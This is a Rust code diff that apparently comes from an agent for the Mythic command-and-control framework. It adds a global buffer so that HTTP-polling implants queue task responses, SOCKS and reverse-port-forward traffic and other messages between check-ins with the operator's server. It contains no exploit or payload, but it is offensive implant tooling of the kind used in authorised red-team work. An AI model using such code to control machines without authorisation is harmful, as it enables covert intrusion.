@@ -11,6 +11,9 @@ pub const USER_OUTPUT_CHUNK_SIZE: usize = 512_000;
 lazy_static::lazy_static! {
     /// Timestamp of last real message from Mythic (for backoff logic)
     pub static ref LAST_MESSAGE_TIME: Mutex<Instant> = Mutex::new(Instant::now());
+    /// Global buffer for poll-based profiles (HTTP). Responses accumulate here
+    /// between poll cycles and get drained into each outgoing get_tasking POST.
+    static ref POLL_BUFFER: Mutex<ResponseBuffer> = Mutex::new(ResponseBuffer::new());
 }
 
 pub fn update_last_message_time() {
@@ -142,8 +145,42 @@ pub fn initialize(
     }
 }
 
+/// Drain the global poll buffer and return a MythicMessage with all pending data.
+/// Called by poll-based profiles (HTTP) each iteration of their polling loop.
+pub fn drain_poll_buffer() -> MythicMessage {
+    let mut buf = POLL_BUFFER.lock().unwrap();
+    create_mythic_poll_message(&mut buf)
+}
+
+/// Store a MythicMessage's contents into the global poll buffer.
+/// Used by response listeners when no push channel is available.
+fn buffer_message(msg: MythicMessage) {
+    let mut buf = POLL_BUFFER.lock().unwrap();
+    if let Some(responses) = msg.responses {
+        buf.responses.extend(responses);
+    }
+    if let Some(delegates) = msg.delegates {
+        buf.delegates.extend(delegates);
+    }
+    if let Some(edges) = msg.edges {
+        buf.edges.extend(edges);
+    }
+    if let Some(interactive) = msg.interactive_tasks {
+        buf.interactive_tasks.extend(interactive);
+    }
+    if let Some(alerts) = msg.alerts {
+        buf.alerts.extend(alerts);
+    }
+    if let Some(socks) = msg.socks {
+        buf.socks.extend(socks);
+    }
+    if let Some(rpfwds) = msg.rpfwds {
+        buf.rpfwds.extend(rpfwds);
+    }
+}
+
 /// Create a MythicMessage for polling, draining all buffered data
-pub fn create_mythic_poll_message(buffer: &mut ResponseBuffer) -> MythicMessage {
+fn create_mythic_poll_message(buffer: &mut ResponseBuffer) -> MythicMessage {
     let mut msg = MythicMessage::new_get_tasking();
 
     if !buffer.responses.is_empty() {
@@ -210,8 +247,10 @@ async fn try_push_or_buffer(
 ) {
     if let Some(push_tx) = get_push_channel() {
         let _ = push_tx.send(msg).await;
+    } else {
+        // Poll-based profile (HTTP): buffer for next poll cycle
+        buffer_message(msg);
     }
-    // If no push channel, message will be picked up in next poll cycle
 }
 
 async fn listen_for_delegate_messages_to_mythic(
